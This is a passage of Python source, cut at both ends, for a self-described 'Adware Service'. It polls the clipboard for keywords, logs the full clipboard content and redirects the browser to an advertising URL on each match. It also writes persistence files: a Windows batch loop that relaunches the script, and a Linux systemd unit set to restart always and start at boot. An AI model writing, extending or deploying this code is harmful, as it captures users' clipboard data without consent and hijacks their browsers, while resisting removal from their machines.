    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    except Exception as e:
        print(f"Error creating log directory: {e}")
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    logging.info("Clipboard monitoring started.")

def log_match(keyword, content, ad_url):
    logging.info(f"Detected keyword: {keyword} | Clipboard content: {content} | Redirecting to: {ad_url}")

def create_persistence_service():
    system = platform.system()
    if system == 'Windows':
        try:
            service_file = f'./target/{SERVICE_NAME_WINDOWS}.bat'
            with open(service_file, 'w') as f:
                f.write(f"""
                :loop
                python "{os.path.abspath(__file__)}"
                timeout /t 5
                goto loop
                """)
            logging.info(f"Created Windows persistence batch file: {service_file}")
        except Exception as e:
            logging.error(f"Error creating Windows persistence file: {e}")
    elif system == 'Linux':
        try:
            service_file = f'./target/{SERVICE_NAME_LINUX}.service'
            with open(service_file, 'w') as f:
                f.write(f"""
                [Unit]
                Description=Adware Service
                After=network.target

                [Service]
                ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
                Restart=always

                [Install]
                WantedBy=multi-user.target
                """)
            logging.info(f"Created Linux persistence service file: {service_file}")
        except Exception as e:
            logging.error(f"Error creating Linux persistence file: {e}")
    else:
        logging.warning(f"Unsupported platform: {system}. Unable to create persistence service.")

def monitor_clipboard(keywords, interval, iterations, ad_url):
    last_clipboard_content = get_clipboard_data()
    for _ in range(iterations):
        time.sleep(interval)
        current_clipboard_content = get_clipboard_data()
        if current_clipboard_content != last_clipboard_content:
            for keyword in keywords:
                if keyword in current_clipboard_content:
                    print(f"Detected keyword: {keyword}")
                    log_match(keyword, current_clipboard_content, ad_url)
                    redirect_browser(ad_url)
                    last_clipboard_content = current_clipboard_content
                    break

